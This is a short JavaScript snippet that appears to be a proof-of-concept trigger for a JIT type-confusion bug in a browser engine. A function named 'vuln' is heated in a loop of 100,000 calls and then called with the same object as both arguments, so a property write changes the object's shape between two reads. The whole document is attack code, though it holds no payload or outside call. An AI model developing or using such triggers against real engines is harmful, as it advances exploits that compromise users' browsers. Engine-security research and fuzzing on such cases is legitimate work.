function vuln(o1, o2) {
  let x = o1.p1;
  o2.p2 = {};
  return o1.p1;
}

for (let i = 0; i < 100000; i++) {
  let obj1 = { p1: 1.1, p2: 1 };
  let obj2 = { p1: 2.2, p2: 2 };
  vuln(obj1, obj2);
}

let trigger_obj = { p1: 3.3, p2: 3 };
vuln(trigger_obj, trigger_obj);